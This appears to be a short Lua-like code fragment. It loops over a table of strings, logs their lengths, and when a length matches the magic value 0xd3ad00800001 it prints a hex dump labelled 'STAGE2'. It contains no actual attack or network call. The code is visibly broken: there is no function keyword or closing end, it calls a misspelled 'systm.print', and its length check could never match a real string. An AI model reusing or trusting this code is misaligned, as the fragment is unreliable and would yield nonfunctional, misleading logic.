RetrieveStrings(T)

local i = 0
while i < #T do
  local s = T[i+1]
  log("Length: ", #s)

  -- Signature set via socket
  if #s == 0xd3ad00800001 then
    local text, hex = HexExtract:Extract(s, 568)
    systm.print("@@@BEGIN-HEXDUMP label=STAGE2\n");
    HexExtract:DumpHex(hex)
    systm.print("@@@END-HEXDUMP\n");
    break
  end

  -- Remove reference to avoid GC visits
  T[i+1] = 0
  i = i + 1
end
